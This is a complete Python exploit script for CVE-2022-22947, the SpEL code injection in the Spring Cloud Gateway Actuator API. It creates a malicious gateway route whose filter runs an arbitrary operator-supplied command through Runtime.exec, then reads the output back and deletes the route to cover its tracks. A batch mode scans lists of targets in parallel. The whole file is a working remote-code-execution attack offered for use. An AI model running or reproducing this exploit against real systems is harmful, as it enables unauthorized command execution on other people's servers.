import argparse
import re
import sys
import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()
session.keep_alive = False
requests.adapters.DEFAULT_RETRIES = 5
requests.packages.urllib3.disable_warnings()


headers_json = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

headers_xw = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}


def test_path(url):
    try:
        R = requests.post(url=url + "/actuator/gateway/refresh", headers=headers_xw, verify=False, timeout=5)
        if R.status_code == 200:
            print("[*]" + url + "\tgateway path exists!")
            execute_command(url)
        else:
            print("[-]\"" + url + "\"\tThe target has no vulnerabilities")
    except Exception as e:
        print("[-]\"" + url + "\"\tConnect error.")

def execute_command(url):
    payload = '''{\r
          "id": "hacktest",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"'''+str(cmd)+'''\\"}).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }'''

    try:
        R1 = requests.post(url=url + "/actuator/gateway/routes/yTFNR6", data=payload, headers=headers_json, verify=False, timeout=5)
        if R1.status_code != 201:
            print("[-]"+url+"\t"+str(R1.status_code)+"\tCreate Route Fail.")
    except Exception as e:
        print("[-]"+url + "/actuator/gateway/routes/yTFNR6\t"+str(e))
        return
    try:
        R2 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers_xw, verify=False, timeout=5)
        if R2.status_code != 200:
            print("[-]"+url+"\t"+str(R1.status_code)+"\t(1)Route Refresh Fail.")
    except Exception as e:
        print("[-]"+url + "/actuator/gateway/refresh\t"+str(e))
        return
    try:
        R3 = requests.get(url=url + "/actuator/gateway/routes/yTFNR6", headers=headers_xw, verify=False, timeout=5)
        if R3.status_code != 200:
            print("[-]"+url+"\t"+str(R1.status_code)+"\tGet Command Result Fail.")
        else:
            commond_result = re.findall("\[AddResponseHeader Result = '(.*)'\]", R3.content.decode("utf-8"))
            print("[+]"+url+"\tCommand execute result:\n"+ commond_result[0].strip("\\n"))
    except Exception as e:
        print("[-]"+url + "/actuator/gateway/routes/yTFNR6\t"+str(e))
        return
    try:
        R4 = requests.delete(url=url + "/actuator/gateway/routes/yTFNR6", headers=headers_xw, verify=False, timeout=5)
        if R4.status_code != 200:
            print("[-]"+url+"\t"+str(R1.status_code)+"\tDelete Route Fail.")
    except Exception as e:
        print("[-]"+url + "/actuator/gateway/routes/yTFNR6\t"+str(e))
        return
    try:
        R5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers_xw, verify=False, timeout=5)
        if R5.status_code != 200:
            print("[-]"+url+"\t"+str(R1.status_code)+"\t(2)Route Refresh Fail.")
    except Exception as e:
        print("[-]"+url + "/actuator/gateway/refresh\t"+str(e))
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=True,description="Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', action='store', help="Specify IP address,Example:http://127.0.0.1:8080")
    group.add_argument('-f', '--file', action='store', help="Specify the destination URL file")
    parser.add_argument("-c", "--command",help="input execute command,defult:whoami",default="whoami")
    options = parser.parse_args()
    if options.target is None and options.file is None:
        parser.print_help()
        sys.exit(1)
    else:
        cmd = options.command
        if options.target is None:
            target = []
            with open(options.file, "r") as f:
                urls = f.readlines()
            for url in urls:
                url = url.strip("\n")
                if url[:7] == "http://" or url[:8] == "https://":
                    a = url.split("/")
                    url = a[0]+"//"+a[2]
                    target.append(url)
                else:
                    print("[error]\""+url+"\" Add (http:// or https://) to the url.")
            executor = ThreadPoolExecutor(max_workers=5)
            executor.map(test_path,target)

        else:
            url = options.target
            if url[:7] == "http://" or url[:8] == "https://":
                a = url.split("/")
                url = a[0] + "//" + a[2]
                code = test_path(url)
            else:
                print("[error]\""+url+"\" Add (http:// or https://) to the url.")
